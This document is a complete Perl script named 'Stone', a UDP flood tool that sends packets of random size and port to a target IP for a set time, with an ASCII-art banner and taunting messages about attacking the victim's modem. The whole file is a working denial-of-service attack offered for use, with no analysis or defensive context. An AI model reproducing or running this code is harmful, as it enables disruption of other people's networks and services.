#!/usr/bin/perl

#########
# Stone #
#########

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Invalid Command $ip\n";
$endtime = time() + ($time ? $time : 1000);

socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT; 
                                                        
                                                          ::                                                          
                                                          .,                                                          
                                                          #@                                                          
                                                          ##`                                                         
                                                         @###`                                                        
                                                         ####      ``                                                 
                                                @#      .####:      @:                                                
                                                  :     @#'+##     #``                                                
                                                  ;#`   ## `##    @,                                                  
                                                   #@  .#+  ##:  @#                                                   
                                                   ,## @#@  @#@ @#,                                                   
                                                    @##+#.  `#####                                                    
                                                    ,####    ####;                                                    
                                                     +###    @###                                                     
                                                     +###    ###@                                                     
                                                      ::.    .;;`                                                     
                                                   ``#@@@@@@@@@@@.`                                                   
                                                     `...........                                                     
                                                     ############                                                     
                                                     ##@@@@@@@@@@`                                                    
                                                     #@                                                               
                                                     @#########+#                                                     
                                                               @#                                                     
                                                     ############                                                     
                                                     ############                                                     
                                                     `                                                                
                                                                                                                      
                        `  ## ##,++@ #####.@####@.##   ####@     #####.;#+### @####@ @####'                           
                           #+ ##,'#@.##.#+.##,+#@.##   ##,##`    ##.##@..##;. ##.'#@ ##,@#+                           
                           ## ##,'#@.## ##.##.'#@.##   ## ##  :  +#      @#:  ## '#@ ## @#+                           
                           ## ##,'#@.## ##.##.'#@.##   #+ ##  +  ##```   @#:  ## '#@ ## @#+                           
                           ## ##,'#@.## ##.##.'#@.##   ## '.,,':,, ###,  @#:  ## '#@ ## @#+                           
                           ## ##,'#@.## ##.##;'#@.##   ## ##,''''   #+@  ##: `+####@ ##`##+                           
                           ## ##,'#@.## ##.####+;.##   ## #@#''' ## @#@  ##: @#####@ ####@`                           
                           ## ##,'#@.## ##.##.'# .+#   ## ##.+;'.+# @#@  ##:  ## '#@ ## @#                            
                           ## ##,+#@.## ##.##.'#@.##   ## ##,  '`## @#@  ##:  ## '#@ ## @#'                           
                           ##`##,'#@.#@ ##.##.'#@.##   ## ##`  ' ;# @#@  ##:  ## '#@ ## @#'                           
                           ##+#####@,####+`##,'#@.#### #####   .`#####@  @#:  +# '#@ ## @#+                           
                            ..`````.`....`  ` '#@`.,`  ....`      .....                 @#+                           
                           `                  '#@    ,       `  '       `   ` `    #    @#+                           
                                              '#@    :   `    ;;`     ` `   #      #::  @#+                           
                                              +@# `  ,   `            ` `    @+    #    @@'                           
                                                        `                                                             
EOTEXT

print "~DISCONNECTING~ $ip " . ($port ? $port : "on random ports") . " 
I just dropped a connection with " .
  ($size ? "$size-bytes" : "a random packetsize") . " 
Stoner is attacting your modem " .
  ($time ? " for $time seconds" : "") . "\n";
print "To stop the attack type Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(65000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, 
$iaddr));}